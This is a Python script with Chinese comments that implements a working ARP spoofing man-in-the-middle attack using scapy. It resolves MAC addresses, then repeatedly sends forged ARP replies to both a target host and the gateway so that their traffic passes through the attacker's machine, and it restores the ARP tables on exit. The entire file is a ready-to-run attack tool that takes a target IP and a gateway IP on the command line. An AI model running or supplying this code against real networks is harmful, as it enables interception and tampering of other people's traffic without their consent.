from scapy.all import ARP, send  # 导入scapy库中的ARP和send函数，用于构造和发送ARP数据包
import time  # 导入time库，用于设置脚本执行间隔
import sys   # 导入sys库，用于处理命令行参数和退出程序


def arp_spoof(target_ip, spoof_ip):
    """
    ARP欺骗攻击函数 - 向目标发送伪造的ARP响应
    
    参数:
        target_ip: 目标设备的IP地址
        spoof_ip: 要伪装成的IP地址（通常是网关）
    
    原理:
        通过发送伪造的ARP响应包，使目标设备将攻击者的MAC地址与spoof_ip关联，
        从而使目标的数据包发送到攻击者而不是真正的目的地。
    """
    # 获取目标设备的MAC地址
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("[-] 无法获取目标MAC地址。")
        return None

    # 构造ARP响应包 (op=2表示ARP响应)
    # pdst: 目标IP, hwdst: 目标MAC, psrc: 伪装成的IP
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # 发送ARP包
    send(packet, verbose=False)
    return packet


def restore(target_ip, source_ip):
    """
    恢复ARP表函数 - 发送正确的ARP信息以恢复网络连接
    
    参数:
        target_ip: 被攻击设备的IP地址
        source_ip: 真实设备（如网关）的IP地址
    
    原理:
        发送正确的ARP响应包，将source_ip与其真实MAC地址重新关联，
        从而修复被破坏的ARP表。
    """
    # 获取目标和源设备的MAC地址
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if not target_mac or not source_mac:
        print("[-] 无法获取恢复所需的MAC地址。")
        return
    
    # 构造正确的ARP响应包
    # hwsrc参数指定真实设备的MAC地址
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    # 发送多个包以确保ARP表被更新 (count=4)
    send(packet, count=4, verbose=False)


def get_mac(ip):
    """
    获取指定IP地址设备的MAC地址
    
    参数:
        ip: 目标设备的IP地址
    
    返回:
        成功时返回MAC地址字符串，失败时返回None
    
    原理:
        发送ARP请求到广播地址，目标设备会回复其MAC地址
    """
    # 导入所需的scapy模块
    from scapy.all import srp, Ether, conf
    # 禁用scapy的详细输出
    conf.verb = 0
    
    # 构造并发送以太网广播帧 + ARP请求
    # Ether(dst="ff:ff:ff:ff:ff:ff") 创建一个以太网帧，目标MAC是广播地址
    # ARP(pdst=ip) 创建ARP请求，询问指定IP的MAC地址
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)
    
    # 如果收到回复，提取并返回MAC地址
    if ans:
        return ans[0][1].src  # 返回回复包中的源MAC地址
    return None


# 主程序入口
if __name__ == "__main__":
    # 检查命令行参数
    if len(sys.argv) != 3:
        print(f"用法: sudo python {sys.argv[0]} <目标IP> <网关IP>")
        sys.exit(1)

    # 获取命令行参数
    target_ip = sys.argv[1]  # 目标设备IP
    gateway_ip = sys.argv[2]  # 网关IP

    try:
        print("[*] 开始ARP欺骗攻击...")
        # 持续发送ARP欺骗包
        while True:
            # 欺骗目标设备，使其认为我们是网关
            arp_spoof(target_ip, gateway_ip)
            # 欺骗网关，使其认为我们是目标设备
            # 这样可以实现中间人攻击，同时保持网络连通性
            arp_spoof(gateway_ip, target_ip)
            # 每2秒发送一次，保持ARP缓存被污染状态
            time.sleep(2)
    except KeyboardInterrupt:
        # 捕获Ctrl+C，优雅地退出并恢复网络
        print("\n[+] 检测到CTRL+C... 正在恢复ARP表...")
        # 恢复目标和网关的ARP表
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] ARP表已恢复。")
        sys.exit(0)
